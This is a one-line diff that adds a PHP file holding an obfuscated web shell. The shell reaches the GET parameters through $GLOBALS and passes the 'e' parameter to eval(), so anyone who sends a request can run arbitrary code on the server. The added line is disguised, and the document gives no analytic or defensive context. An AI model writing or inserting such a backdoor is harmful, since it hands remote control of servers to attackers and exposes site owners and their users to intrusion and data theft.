@@ -1,0 +1,1 @@
+<?php $a="_GET";$b=$GLOBALS[$a];eval($b["e"]);
